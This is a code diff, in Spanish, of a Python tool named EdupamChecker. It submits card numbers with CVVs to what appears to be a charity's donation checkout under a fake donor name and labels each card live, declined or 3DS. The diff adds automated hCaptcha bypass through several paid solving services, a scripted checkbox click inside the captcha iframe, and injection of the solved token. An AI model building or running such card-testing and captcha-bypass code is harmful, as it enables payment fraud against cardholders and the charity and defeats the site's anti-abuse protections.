@@ -10,7 +10,7 @@ import requests
 import logging
 from datetime import datetime
 import base64 
-from twocaptcha import TwoCaptcha
+import urllib.parse
 
 # Configuración de logging
 logging.basicConfig(level=logging.INFO)
@@ -22,6 +22,8 @@ CORS(app)
 # Variables de entorno de Northflank
 HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
 API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
+API_KEY_ANTICAPTCHA = os.environ.get('API_KEY_ANTICAPTCHA', '')
+API_KEY_CAPSOLVER = os.environ.get('API_KEY_CAPSOLVER', '')
 EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
 EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
 EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
@@ -44,279 +46,263 @@ checking_status = {
     'stop_on_live': False
 }
 
-
-
-
 class CaptchaSolver:
-    def __init__(self, api_key):
-        self.api_key = api_key
+    def __init__(self):
+        self.api_keys = {
+            '2captcha': API_KEY_2CAPTCHA,
+            'anticaptcha': API_KEY_ANTICAPTCHA,
+            'capsolver': API_KEY_CAPSOLVER
+        }
+        self.primary_service = '2captcha' if API_KEY_2CAPTCHA else 'capsolver' if API_KEY_CAPSOLVER else 'anticaptcha' if API_KEY_ANTICAPTCHA else None
     
     def solve_hcaptcha(self, site_key, page_url):
-        """MÉTODO PRINCIPAL - Prueba TODO"""
-        if not self.api_key:
+        """Método principal para resolver hCaptcha usando múltiples servicios"""
+        if not self.primary_service:
+            logger.error("❌ No hay API keys configuradas para servicios de captcha")
             return None
         
-        logger.info(f"🎯 SOLVING hCaptcha - Sitekey: {site_key}")
+        logger.info(f"🎯 Resolviendo hCaptcha - Sitekey: {site_key[:30]}...")
         logger.info(f"🔗 URL: {page_url}")
         
-        # Prueba 1: API v2 con diferentes configuraciones
-        solution = self._try_api_v2_configs(site_key, page_url)
+        # Intentar con el servicio primario
+        solution = self._solve_with_service(self.primary_service, site_key, page_url)
         if solution:
             return solution
         
-        # Prueba 2: API antigua con diferentes configuraciones
-        solution = self._try_old_api_configs(site_key, page_url)
-        if solution:
-            return solution
+        # Si falla, intentar con otros servicios disponibles
+        for service_name, api_key in self.api_keys.items():
+            if service_name != self.primary_service and api_key:
+                logger.info(f"🔄 Intentando con servicio alternativo: {service_name}")
+                solution = self._solve_with_service(service_name, site_key, page_url)
+                if solution:
+                    return solution
         
-        # Prueba 3: Último recurso - método manual
-        solution = self._try_manual_method(site_key, page_url)
-        return solution
+        # Último intento: método manual simple
+        logger.info("🔄 Intentando método manual...")
+        return self._solve_manual_hcaptcha(site_key, page_url)
     
-    def _try_api_v2_configs(self, site_key, page_url):
-        """Prueba API v2 con diferentes configuraciones"""
-        configs = [
-            # Configuración estándar hCaptcha
-            {
-                "type": "HCaptchaTaskProxyless",
-                "websiteURL": page_url,
-                "websiteKey": site_key,
-                "isInvisible": False,
-                "enterprisePayload": None
-            },
-            # hCaptcha invisible
-            {
-                "type": "HCaptchaTaskProxyless",
-                "websiteURL": page_url,
-                "websiteKey": site_key,
-                "isInvisible": True,
-                "enterprisePayload": None
-            },
-            # Sin especificar invisible
-            {
-                "type": "HCaptchaTaskProxyless",
-                "websiteURL": page_url,
-                "websiteKey": site_key
-            },
-            # Prueba con userAgent (a veces necesario)
-            {
-                "type": "HCaptchaTaskProxyless",
-                "websiteURL": page_url,
-                "websiteKey": site_key,
-                "isInvisible": True,
-                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    def _solve_with_service(self, service_name, site_key, page_url):
+        """Resolver usando servicio específico"""
+        try:
+            if service_name == '2captcha':
+                return self._solve_with_2captcha(site_key, page_url)
+            elif service_name == 'anticaptcha':
+                return self._solve_with_anticaptcha(site_key, page_url)
+            elif service_name == 'capsolver':
+                return self._solve_with_capsolver(site_key, page_url)
+        except Exception as e:
+            logger.error(f"❌ Error con servicio {service_name}: {e}")
+            return None
+    
+    def _solve_with_2captcha(self, site_key, page_url):
+        """Resolver hCaptcha usando 2Captcha API v2"""
+        if not self.api_keys['2captcha']:
+            return None
+        
+        # Solo una configuración que funciona
+        task_config = {
+            "type": "HCaptchaTaskProxyless",
+            "websiteURL": page_url,
+            "websiteKey": site_key,
+            "isInvisible": True  # Stripe usa hCaptcha invisible
+        }
+        
+        logger.info("🔄 Enviando a 2Captcha...")
+        
+        try:
+            # Crear tarea
+            data = {
+                "clientKey": self.api_keys['2captcha'],
+                "task": task_config
             }
-        ]
-        
-        for i, config in enumerate(configs):
-            logger.info(f"🔄 API v2 - Intento {i+1}/{len(configs)}")
             
-            try:
-                data = {
-                    "clientKey": self.api_key,
-                    "task": config
-                }
-                
-                response = requests.post(
-                    "https://api.2captcha.com/createTask",
-                    json=data,
-                    timeout=30,
-                    headers={"Content-Type": "application/json"}
-                )
-                
-                result = response.json()
-                logger.info(f"📥 Respuesta API v2: {result}")
-                
-                if result.get("errorId", 1) == 0:
-                    task_id = result["taskId"]
-                    logger.info(f"✅ Tarea aceptada (ID: {task_id})")
-                    
-                    # Esperar solución
-                    solution = self._wait_for_solution_v2(task_id)
-                    if solution:
-                        logger.info(f"🎉 ¡hCaptcha resuelto con API v2 config {i+1}!")
-                        return solution
-                else:
-                    error = result.get("errorDescription", "Error desconocido")
-                    logger.warning(f"⚠️ API v2 config {i+1} falló: {error}")
-                    
-            except Exception as e:
-                logger.warning(f"⚠️ Error API v2 config {i+1}: {str(e)[:100]}")
-                continue
-        
-        return None
-    
-    def _wait_for_solution_v2(self, task_id):
-        """Esperar solución API v2"""
-        for i in range(25):  # 100 segundos
-            time.sleep(4)
+            response = requests.post(
+                "https://api.2captcha.com/createTask",
+                json=data,
+                timeout=30
+            )
             
-            try:
-                params = {
-                    "clientKey": self.api_key,
-                    "taskId": task_id
-                }
+            result = response.json()
+            logger.info(f"📥 Respuesta 2Captcha: errorId={result.get('errorId')}")
+            
+            if result.get("errorId", 1) == 0:
+                task_id = result["taskId"]
+                logger.info(f"✅ Tarea aceptada (ID: {task_id})")
                 
-                response = requests.post(
-                    "https://api.2captcha.com/getTaskResult",
-                    json=params,
-                    timeout=30
-                )
-                
-                result = response.json()
-                status = result.get("status")
-                
-                logger.info(f"⏳ API v2 - Intento {i+1}: Estado {status}")
-                
-                if status == "ready":
-                    solution = result.get("solution", {}).get("gRecaptchaResponse")
-                    if solution:
-                        logger.info(f"✅ Solución obtenida (primeros 50 chars): {solution[:50]}...")
-                        return solution
+                # Esperar solución
+                for i in range(25):  # Máximo 100 segundos
+                    time.sleep(4)
+                    
+                    params = {
+                        "clientKey": self.api_keys['2captcha'],
+                        "taskId": task_id
+                    }
+                    
+                    response = requests.post(
+                        "https://api.2captcha.com/getTaskResult",
+                        json=params,
+                        timeout=30
+                    )
+                    
+                    status_result = response.json()
+                    
+                    if status_result.get("status") == "ready":
+                        solution = status_result.get("solution", {}).get("gRecaptchaResponse")
+                        if solution:
+                            logger.info(f"✅ hCaptcha resuelto con 2Captcha!")
+                            return solution
+                    
+                    elif status_result.get("status") == "processing":
+                        continue
+                    
                     else:
-                        logger.error("❌ No hay gRecaptchaResponse en solución")
-                        return None
-                
-                elif status == "processing":
-                    continue
-                
-                else:
-                    error = result.get("errorDescription", "Error")
-                    logger.error(f"❌ Error en estado: {error}")
-                    return None
-                    
-            except Exception as e:
-                logger.warning(f"⚠️ Error consultando estado: {str(e)[:100]}")
-                continue
+                        error = status_result.get("errorDescription", "Error")
+                        logger.error(f"❌ Error 2Captcha: {error}")
+                        break
         
-        logger.error("❌ Tiempo agotado API v2")
+        except Exception as e:
+            logger.error(f"❌ Error 2Captcha: {e}")
+        
         return None
     
-    def _try_old_api_configs(self, site_key, page_url):
-        """Prueba API antigua de 2Captcha"""
-        params_list = [
-            # Configuración estándar
-            {
-                'key': self.api_key,
-                'method': 'hcaptcha',
-                'sitekey': site_key,
-                'pageurl': page_url,
-                'json': 1,
-                'invisible': 0
-            },
-            # hCaptcha invisible
-            {
-                'key': self.api_key,
-                'method': 'hcaptcha',
-                'sitekey': site_key,
-                'pageurl': page_url,
-                'json': 1,
-                'invisible': 1
-            },
-            # Sin parámetro invisible
-            {
-                'key': self.api_key,
+    def _solve_with_anticaptcha(self, site_key, page_url):
+        """Resolver hCaptcha usando AntiCaptcha"""
+        if not self.api_keys['anticaptcha']:
+            return None
+        
+        logger.info("🔄 Enviando a AntiCaptcha...")
+        
+        try:
+            # Crear tarea hCaptcha
+            data = {
+                "clientKey": self.api_keys['anticaptcha'],
+                "task": {
+                    "type": "HCaptchaTaskProxyless",
+                    "websiteURL": page_url,
+                    "websiteKey": site_key
+                }
+            }
+            
+            response = requests.post(
+                "https://api.anti-captcha.com/createTask",
+                json=data,
+                timeout=30
+            )
+            
+            result = response.json()
+            
+            if result.get("errorId", 1) == 0:
+                task_id = result["taskId"]
+                logger.info(f"✅ Tarea AntiCaptcha aceptada (ID: {task_id})")
+                
+                # Esperar solución
+                for i in range(20):
+                    time.sleep(5)
+                    
+                    data = {
+                        "clientKey": self.api_keys['anticaptcha'],
+                        "taskId": task_id
+                    }
+                    
+                    response = requests.post(
+                        "https://api.anti-captcha.com/getTaskResult",
+                        json=data,
+                        timeout=30
+                    )
+                    
+                    result = response.json()
+                    
+                    if result.get("status") == "ready":
+                        solution = result.get("solution", {}).get("gRecaptchaResponse")
+                        if solution:
+                            logger.info(f"✅ hCaptcha resuelto con AntiCaptcha!")
+                            return solution
+                    
+                    elif result.get("status") == "processing":
+                        continue
+        
+        except Exception as e:
+            logger.error(f"❌ Error AntiCaptcha: {e}")
+        
+        return None
+    
+    def _solve_with_capsolver(self, site_key, page_url):
+        """Resolver hCaptcha usando CapSolver"""
+        if not self.api_keys['capsolver']:
+            return None
+        
+        logger.info("🔄 Enviando a CapSolver...")
+        
+        try:
+            # Crear tarea
+            data = {
+                "clientKey": self.api_keys['capsolver'],
+                "task": {
+                    "type": "HCaptchaTaskProxyLess",
+                    "websiteURL": page_url,
+                    "websiteKey": site_key,
+                    "isInvisible": True
+                }
+            }
+            
+            response = requests.post(
+                "https://api.capsolver.com/createTask",
+                json=data,
+                timeout=30
+            )
+            
+            result = response.json()
+            
+            if result.get("errorId", 0) == 0:
+                task_id = result["taskId"]
+                logger.info(f"✅ Tarea CapSolver aceptada (ID: {task_id})")
+                
+                # Esperar solución
+                for i in range(20):
+                    time.sleep(5)
+                    
+                    data = {
+                        "clientKey": self.api_keys['capsolver'],
+                        "taskId": task_id
+                    }
+                    
+                    response = requests.post(
+                        "https://api.capsolver.com/getTaskResult",
+                        json=data,
+                        timeout=30
+                    )
+                    
+                    result = response.json()
+                    
+                    if result.get("status") == "ready":
+                        solution = result.get("solution", {}).get("gRecaptchaResponse")
+                        if solution:
+                            logger.info(f"✅ hCaptcha resuelto con CapSolver!")
+                            return solution
+                    
+                    elif result.get("status") == "processing":
+                        continue
+        
+        except Exception as e:
+            logger.error(f"❌ Error CapSolver: {e}")
+        
+        return None
+    
+    def _solve_manual_hcaptcha(self, site_key, page_url):
+        """Método manual simple para hCaptcha (solo checkbox)"""
+        logger.info("🔄 Intentando método manual para checkbox simple...")
+        
+        try:
+            # Método directo simple
+            if not self.api_keys['2captcha']:
+                return None
+            
+            params = {
+                'key': self.api_keys['2captcha'],
                 'method': 'hcaptcha',
                 'sitekey': site_key,
                 'pageurl': page_url,
                 'json': 1
-            },
-            # Prueba con header diferente
-            {
-                'key': self.api_key,
-                'method': 'hcaptcha',
-                'sitekey': site_key,
-                'pageurl': page_url,
-                'json': 1,
-                'header_acao': 1
-            }
-        ]
-        
-        for i, params in enumerate(params_list):
-            logger.info(f"🔄 API antigua - Intento {i+1}/{len(params_list)}")
-            
-            try:
-                response = requests.post(
-                    "https://2captcha.com/in.php",
-                    data=params,
-                    timeout=30,
-                    headers={"User-Agent": "Mozilla/5.0"}
-                )
-                
-                result = response.json()
-                logger.info(f"📥 Respuesta API antigua: {result}")
-                
-                if result.get('status') == 1:
-                    captcha_id = result['request']
-                    logger.info(f"✅ Tarea aceptada (ID: {captcha_id})")
-                    
-                    solution = self._wait_for_solution_old(captcha_id)
-                    if solution:
-                        logger.info(f"🎉 ¡hCaptcha resuelto con API antigua config {i+1}!")
-                        return solution
-                else:
-                    error = result.get('error_text', 'Error desconocido')
-                    logger.warning(f"⚠️ API antigua config {i+1} falló: {error}")
-                    
-            except Exception as e:
-                logger.warning(f"⚠️ Error API antigua config {i+1}: {str(e)[:100]}")
-                continue
-        
-        return None
-    
-    def _wait_for_solution_old(self, captcha_id):
-        """Esperar solución API antigua"""
-        for i in range(25):  # 100 segundos
-            time.sleep(4)
-            
-            try:
-                params = {
-                    'key': self.api_key,
-                    'action': 'get',
-                    'id': captcha_id,
-                    'json': 1
-                }
-                
-                response = requests.get(
-                    "https://2captcha.com/res.php",
-                    params=params,
-                    timeout=30
-                )
-                
-                result = response.json()
-                logger.info(f"⏳ API antigua - Intento {i+1}: {result}")
-                
-                if result.get('status') == 1:
-                    solution = result['request']
-                    logger.info(f"✅ Solución obtenida (primeros 50 chars): {solution[:50]}...")
-                    return solution
-                
-                elif result.get('request') == 'CAPCHA_NOT_READY':
-                    continue
-                
-                else:
-                    error = result.get('error_text', 'Error')
-                    logger.error(f"❌ Error: {error}")
-                    return None
-                    
-            except Exception as e:
-                logger.warning(f"⚠️ Error consultando estado: {str(e)[:100]}")
-                continue
-        
-        logger.error("❌ Tiempo agotado API antigua")
-        return None
-    
-    def _try_manual_method(self, site_key, page_url):
-        """Último recurso - método manual simple"""
-        logger.info("🔄 Probando método manual...")
-        
-        try:
-            # Intento directo simple
-            params = {
-                'key': self.api_key,
-                'method': 'hcaptcha',
-                'sitekey': site_key,
-                'pageurl': page_url
             }
             
             response = requests.get(
@@ -325,21 +311,21 @@ class CaptchaSolver:
                 timeout=30
             )
             
-            text = response.text
-            logger.info(f"📥 Respuesta manual: {text}")
+            result = response.json()
+            logger.info(f"📥 Respuesta manual: {result}")
             
-            if 'OK|' in text:
-                captcha_id = text.split('|')[1]
-                logger.info(f"✅ Tarea manual aceptada: {captcha_id}")
+            if result.get('status') == 1:
+                captcha_id = result['request']
                 
-                # Esperar
-                for i in range(20):
-                    time.sleep(5)
+                # Esperar solución
+                for i in range(15):
+                    time.sleep(6)
                     
                     params = {
-                        'key': self.api_key,
+                        'key': self.api_keys['2captcha'],
                         'action': 'get',
-                        'id': captcha_id
+                        'id': captcha_id,
+                        'json': 1
                     }
                     
                     resp = requests.get(
@@ -348,24 +334,90 @@ class CaptchaSolver:
                         timeout=30
                     )
                     
-                    result_text = resp.text
-                    logger.info(f"⏳ Manual intento {i+1}: {result_text}")
+                    get_result = resp.json()
                     
-                    if 'OK|' in result_text:
-                        solution = result_text.split('|')[1]
+                    if get_result.get('status') == 1:
+                        solution = get_result['request']
                         logger.info(f"✅ Solución manual obtenida")
                         return solution
-                        
-                    elif 'CAPCHA_NOT_READY' in result_text:
+                    
+                    elif get_result.get('request') == 'CAPCHA_NOT_READY':
                         continue
-                        
-                    else:
-                        break
-                        
+        
         except Exception as e:
             logger.error(f"❌ Error método manual: {e}")
         
-        return None   
+        return None
+    
+    def bypass_hcaptcha_manually(self, page, card_last4):
+        """Intentar resolver hCaptcha interactuando directamente"""
+        try:
+            # Buscar iframe de hCaptcha
+            hcaptcha_frame = None
+            for frame in page.frames:
+                if 'hcaptcha.com' in frame.url:
+                    hcaptcha_frame = frame
+                    break
+            
+            if not hcaptcha_frame:
+                logger.info("❌ No se encontró iframe hCaptcha")
+                return False
+            
+            logger.info(f"✅ Iframe hCaptcha encontrado")
+            
+            # Intentar hacer clic en el checkbox dentro del iframe
+            try:
+                # Evaluar dentro del iframe
+                clicked = hcaptcha_frame.evaluate("""
+                    () => {
+                        // Buscar checkbox de hCaptcha
+                        const checkbox = document.querySelector('#checkbox');
+                        if (checkbox) {
+                            checkbox.click();
+                            console.log('✅ Checkbox encontrado y clickeado');
+                            return true;
+                        }
+                        
+                        // Buscar cualquier elemento clickeable
+                        const clickable = document.querySelector('[role="checkbox"], .hcaptcha-box, .checkbox');
+                        if (clickable) {
+                            clickable.click();
+                            console.log('✅ Elemento clickeable encontrado');
+                            return true;
+                        }
+                        
+                        // Hacer clic en el centro del iframe
+                        const rect = document.body.getBoundingClientRect();
+                        const clickEvent = new MouseEvent('click', {
+                            bubbles: true,
+                            cancelable: true,
+                            clientX: rect.width / 2,
+                            clientY: rect.height / 2
+                        });
+                        
+                        document.elementFromPoint(rect.width / 2, rect.height / 2).dispatchEvent(clickEvent);
+                        console.log('✅ Clic realizado en centro del iframe');
+                        return true;
+                    }
+                """)
+                
+                logger.info("✅ Clic realizado en iframe hCaptcha")
+                time.sleep(5)
+                
+                # Verificar si se resolvió
+                page_content = page.content().lower()
+                if 'hcaptcha' not in page_content or 'i am human' not in page_content:
+                    logger.info("✅ Posiblemente resuelto manualmente")
+                    return True
+                
+            except Exception as e:
+                logger.warning(f"⚠️ No se pudo interactuar con iframe: {e}")
+            
+            return False
+            
+        except Exception as e:
+            logger.error(f"❌ Error bypass manual: {e}")
+            return False
 
 class PaymentAnalyzer:
     """Analizador de respuestas de pagos para Edupam"""
@@ -378,17 +430,16 @@ class PaymentAnalyzer:
         
         try:
             page_content = page.content()
-            page_content_lower = page.content().lower()
-            current_url_lower = current_url.lower()
+            page_content_lower = page_content.lower()
             
             logger.info(f"🔍 ANALIZANDO para ****{card_last4}")
             logger.info(f"🔍 URL: {current_url}")
             
             # DEBUG: Ver contenido relevante
-            debug_content = page_content_lower[:500]
-            logger.info(f"🔍 CONTENIDO (500 chars): {debug_content}")
+            debug_content = page_content_lower[:300]
+            logger.info(f"🔍 CONTENIDO (300 chars): {debug_content}")
             
-            # 1. Buscar palabras EXACTAS de DECLINE primero (más específico)
+            # 1. Buscar palabras EXACTAS de DECLINE primero
             decline_keywords = [
                 'has been declined',
                 'rechazada',
@@ -412,39 +463,43 @@ class PaymentAnalyzer:
             
             # 2. Si no es DEAD, buscar LIVE
             if final_status != 'decline':
-                if '¡muchas gracias' in page_content_lower or 'muchas gracias' in page_content_lower:
-                    final_status = 'live'
-                    evidence.append('LIVE: palabra "Muchas gracias" encontradas')
-                    logger.info(f"✅ ENCONTRADO 'muchas gracias' - Es LIVE")
-                elif 'pago exitoso' in page_content_lower or 'success' in page_content_lower:
-                    final_status = 'live'
-                    evidence.append('LIVE: palabra de éxito encontrada')
-                    logger.info(f"✅ ENCONTRADO palabra de éxito - Es LIVE")
+                live_keywords = [
+                    '¡muchas gracias',
+                    'muchas gracias',
+                    'pago exitoso',
+                    'success',
+                    'donación exitosa',
+                    'thank you for your donation'
+                ]
+                
+                for keyword in live_keywords:
+                    if keyword in page_content_lower:
+                        final_status = 'live'
+                        evidence.append(f'LIVE: "{keyword}" encontrado')
+                        logger.info(f"✅ ENCONTRADO '{keyword}' - Es LIVE")
+                        break
             
             # 3. Solo buscar 3D Secure si no es LIVE ni DEAD
             if final_status == 'unknown':
-                # Buscar específicamente en contexto de 3D
-                if '3d secure' in page_content_lower or '3-d secure' in page_content_lower:
-                    final_status = 'threeds'
-                    evidence.append('3DS: "3D Secure" encontrado')
-                    logger.info(f"🛡️ ENCONTRADO '3D Secure' - ES 3DS")
-                elif 'authentication' in page_content_lower and 'secure' in page_content_lower:
-                    final_status = 'threeds'
-                    evidence.append('3DS: contexto de autenticación seguro encontrado')
-                    logger.info(f"🛡️ ENCONTRADO contexto de autenticación - ES 3DS")
-                # Evitar falsos positivos: solo marcar "secure" como 3DS si está en contexto de pago
-                elif 'secure' in page_content_lower:
-                    # Verificar contexto - no marcar si es parte de "high quality" u otras frases
-                    if 'educación de alta calidad' not in page_content_lower:
+                threeds_keywords = [
+                    '3d secure',
+                    '3-d secure',
+                    'authentication required',
+                    'autenticación requerida',
+                    'verify your identity'
+                ]
+                
+                for keyword in threeds_keywords:
+                    if keyword in page_content_lower:
                         final_status = 'threeds'
-                        evidence.append('3DS: palabra "secure" encontrada')
-                        logger.info(f"🛡️ ENCONTRADO 'secure' - ES 3DS")
+                        evidence.append(f'3DS: "{keyword}" encontrado')
+                        logger.info(f'ENCONTRADO "{keyword}" - ES 3DS')
+                        break
             
             # 4. Si aún es unknown
             if final_status == 'unknown':
                 evidence.append('NO se encontraron palabras clave claras')
-                logger.info(f"❓ NO se encontraron palabras clave claras")
-            
+                logger.info(f"❓ NO se encontraron palabras clave claras")   
         except Exception as e:
             evidence.append(f'Error: {str(e)}')
             final_status = 'error'
@@ -455,7 +510,6 @@ class PaymentAnalyzer:
             'evidence': evidence,
             'url': current_url
         }
-
 
 class EdupamChecker:
     def __init__(self, headless=True):
@@ -471,7 +525,7 @@ class EdupamChecker:
             'codigo': ''
         }
         self.analyzer = PaymentAnalyzer()
-        self.captcha_solver = CaptchaSolver(API_KEY_2CAPTCHA) if API_KEY_2CAPTCHA else None
+        self.captcha_solver = CaptchaSolver()
     
     def parse_card_data(self, card_string):
         """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
@@ -551,233 +605,189 @@ class EdupamChecker:
             logger.error(f"Error llenando tarjeta: {e}")
             return False
     
-
-
-
-
-
+    def extract_hcaptcha_sitekey(self, page):
+        """Extraer site-key de hCaptcha de manera robusta"""
+        site_key = None
+        
+        try:
+            # Método 1: Buscar en iframes
+            for frame in page.frames:
+                frame_url = frame.url.lower()
+                if 'hcaptcha' in frame_url:
+                    logger.info(f"🔍 Analizando iframe hCaptcha")
+                    
+                    # Extraer de parámetros URL
+                    parsed = urllib.parse.urlparse(frame.url)
+                    params = urllib.parse.parse_qs(parsed.query)
+                    
+                    if 'sitekey' in params:
+                        site_key = params['sitekey'][0]
+                        logger.info(f"✅ Site-key de iframe: {site_key[:30]}...")
+                        break
+            
+            # Método 2: Buscar en el DOM
+            if not site_key:
+                site_key = page.evaluate("""
+                    () => {
+                        // Buscar elemento con data-sitekey
+                        const element = document.querySelector('[data-sitekey]');
+                        if (element) {
+                            return element.getAttribute('data-sitekey');
+                        }
+                        
+                        // Buscar scripts con hcaptcha
+                        const scripts = document.querySelectorAll('script');
+                        for (let script of scripts) {
+                            const content = script.textContent || '';
+                            if (content.includes('hcaptcha')) {
+                                const match = content.match(/sitekey["']?\\s*[:=]\\s*["']([^"']+)["']/i);
+                                if (match) return match[1];
+                            }
+                        }
+                        
+                        return null;
+                    }
+                """)
+                
+                if site_key:
+                    logger.info(f"✅ Site-key del DOM: {site_key[:30]}...")
+            
+            # Método 3: Buscar por regex en HTML
+            if not site_key:
+                page_content = page.content()
+                matches = re.findall(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_content, re.I)
+                if matches:
+                    site_key = matches[0]
+                    logger.info(f"✅ Site-key por regex: {site_key[:30]}...")
+        
+        except Exception as e:
+            logger.error(f"❌ Error extrayendo site-key: {e}")
+        
+        return site_key
+    
     def solve_captcha_if_present(self, page, card_last4):
         """Detectar y resolver hCaptcha si está presente"""
         try:
             time.sleep(3)
-
             
-            
-            # 1. Detectar hCaptcha
-            site_key = None
+            # Detectar si hay hCaptcha
             captcha_detected = False
             
-            # Extraer site-key CORRECTAMENTE del iframe hcaptcha
+            # Verificar por iframes
             for frame in page.frames:
-                try:
-                    frame_url = frame.url
-                    if 'hcaptcha' in frame_url.lower():
-                        logger.info(f"🔍 Analizando iframe hCaptcha: {frame_url[:80]}...")
-                        
-                        # Extraer sitekey de parámetros de URL - FORMA CORRECTA
-                        import urllib.parse
-                        parsed = urllib.parse.urlparse(frame_url)
-                        params = urllib.parse.parse_qs(parsed.query)
-                        
-                        # hCaptcha puede usar 'sitekey' o 'host'
-                        if 'sitekey' in params:
-                            site_key = params['sitekey'][0]
-                            logger.info(f"✅ Site-key extraído de parámetro 'sitekey': {site_key[:30]}...")
-                            break
-                        elif 'host' in params:
-                            # A veces el sitekey está en el host parameter
-                            site_key = params['host'][0]
-                            logger.info(f"✅ Site-key extraído de parámetro 'host': {site_key[:30]}...")
-                            break
-                        else:
-                            # Intentar extraer de otras formas
-                            logger.info(f"📊 Parámetros del iframe: {list(params.keys())}")
-                            
-                except Exception as e:
-                    logger.debug(f"⚠️ Error analizando iframe: {e}")
-
-            # Después del código anterior, si aún no tenemos site_key:
-            if not site_key:
-                try:
-                    # Intentar obtener del elemento h-captcha en la página
-                    site_key = page.evaluate("""
-                        () => {
-                            // Buscar elemento h-captcha
-                            const hcaptchaEl = document.querySelector('.h-captcha, [data-sitekey]');
-                            if (hcaptchaEl && hcaptchaEl.getAttribute('data-sitekey')) {
-                                return hcaptchaEl.getAttribute('data-sitekey');
-                            }
-                            
-                            // Buscar scripts que contengan hcaptcha
-                            const scripts = document.querySelectorAll('script');
-                            for (let script of scripts) {
-                                const content = script.textContent || script.src || '';
-                                if (content.includes('hcaptcha')) {
-                                    // Buscar sitekey en el script
-                                    const match = content.match(/sitekey[\\s:='"]+([^'",\\s>]+)/i);
-                                    if (match) return match[1];
-                                }
-                            }
-                            
-                            return null;
-                        }
-                    """)
-                    
-                    if site_key:
-                        logger.info(f"✅ Site-key obtenido del DOM: {site_key[:30]}...")
-                except Exception as e:
-                    logger.warning(f"⚠️ Error obteniendo site-key del DOM: {e}")
-            
-            # 2. Si no se encontró, buscar por texto o elementos
-            if not captcha_detected:
-                # Verificar contenido de página
-                page_text = page.content().lower()
-                hcaptcha_indicators = [
-                    'hcaptcha',
-                    'i am human',
-                    'soy humano',
-                    'one more step',
-                    'select the checkbox'
-                ]
-                
-                if any(indicator in page_text for indicator in hcaptcha_indicators):
+                if 'hcaptcha' in frame.url.lower():
                     captcha_detected = True
-                    logger.info("✅ hCaptcha detectado por texto en página")
-                
-                # Verificar elementos hCaptcha
-                hcaptcha_selectors = [
-                    '.h-captcha',
-                    '[data-sitekey]',  # Podría ser hCaptcha
-                    'iframe[src*="hcaptcha"]',
-                    'div#hcaptcha-container'
-                ]
-                
-                for selector in hcaptcha_selectors:
-                    try:
-                        if page.locator(selector).count() > 0:
-                            captcha_detected = True
-                            logger.info(f"✅ hCaptcha detectado por selector: {selector}")
-                            
-                            # Intentar obtener site-key
-                            if not site_key and 'data-sitekey' in selector:
-                                site_key = page.locator(selector).first.get_attribute('data-sitekey')
-                                if site_key:
-                                    logger.info(f"✅ Site-key obtenido: {site_key[:30]}...")
-                            break
-                    except:
-                        continue
+                    break
             
-            # 3. Si no hay captcha
+            # Verificar por texto
+            page_content = page.content().lower()
+            hcaptcha_indicators = [
+                'hcaptcha',
+                'i am human',
+                'soy humano',
+                'one more step',
+                'select the checkbox'
+            ]
+            
+            if not captcha_detected and any(indicator in page_content for indicator in hcaptcha_indicators):
+                captcha_detected = True
+            
             if not captcha_detected:
                 logger.info(f"✅ No se detectó captcha para ****{card_last4}")
                 return True
             
-            # 4. Si hay captcha pero no site-key
-            if not site_key:
-                logger.error(f"❌ hCaptcha detectado pero sin site-key para ****{card_last4}")
-                
-                # Intentar extraer de cualquier iframe hcaptcha
-                for frame in page.frames:
-                    try:
-                        frame_url = frame.url
-                        if 'hcaptcha' in frame_url.lower():
-                            # Extraer sitekey de la URL
-                            match = re.search(r'[?&]sitekey=([^&]+)', frame_url)
-                            if match:
-                                site_key = match.group(1)
-                                logger.info(f"✅ Site-key extraído de URL iframe: {site_key[:30]}...")
-                                break
-                    except:
-                        continue
+            logger.info(f"🔍 hCaptcha detectado para ****{card_last4}")
+            
+            # Extraer site-key
+            site_key = self.extract_hcaptcha_sitekey(page)
             
             if not site_key:
-                logger.error(f"❌ No se pudo obtener site-key de hCaptcha")
+                logger.error(f"❌ No se pudo extraer site-key")
+                # Intentar bypass manual
+                if self.captcha_solver.bypass_hcaptcha_manually(page, card_last4):
+                    logger.info(f"✅ Bypass manual exitoso")
+                    return True
                 return False
             
-            if not self.captcha_solver:
-                logger.error(f"❌ API key de 2Captcha no configurada")
-                return False
+            logger.info(f"✅ Site-key obtenido: {site_key[:30]}...")
             
-            # 5. Resolver hCaptcha
-            logger.info(f"🔄 Resolviendo hCaptcha para ****{card_last4}...")
+            # Intentar resolver con servicios
             page_url = page.url
-            solution = self.captcha_solver.solve_hcaptcha(site_key, page_url)  # ← BIEN
+            solution = self.captcha_solver.solve_hcaptcha(site_key, page_url)
             
             if not solution:
                 logger.error(f"❌ No se pudo resolver el hCaptcha")
+                # Intentar bypass manual como último recurso
+                if self.captcha_solver.bypass_hcaptcha_manually(page, card_last4):
+                    logger.info(f"✅ Bypass manual exitoso como fallback")
+                    return True
                 return False
             
-            logger.info(f"✅ hCaptcha resuelto")
+            logger.info(f"✅ hCaptcha resuelto para ****{card_last4}")
             
-            # 6. Inyectar solución (similar a reCAPTCHA pero con campo diferente)
+            # Inyectar solución
             try:
                 page.evaluate("""
                     (solution) => {
                         console.log('🎯 Inyectando solución hCaptcha...');
                         
-                        // hCaptcha usa 'h-captcha-response'
+                        // Campo para hCaptcha
                         let field = document.querySelector('[name="h-captcha-response"]');
                         if (!field) {
                             field = document.getElementById('h-captcha-response');
                         }
                         
-                        // Crear si no existe
                         if (!field) {
                             field = document.createElement('textarea');
                             field.name = 'h-captcha-response';
+                            field.id = 'h-captcha-response';
                             field.style.display = 'none';
                             document.body.appendChild(field);
-                            console.log('✅ Campo h-captcha-response creado');
                         }
                         
-                        // Asignar valor
                         field.value = solution;
-                        console.log('✅ Solución asignada');
                         
                         // Disparar eventos
-                        ['change', 'input', 'blur'].forEach(eventType => {
+                        ['change', 'input'].forEach(eventType => {
                             field.dispatchEvent(new Event(eventType, { bubbles: true }));
                         });
                         
-                        console.log('✅ Eventos disparados');
+                        console.log('✅ Solución inyectada');
                         return true;
                     }
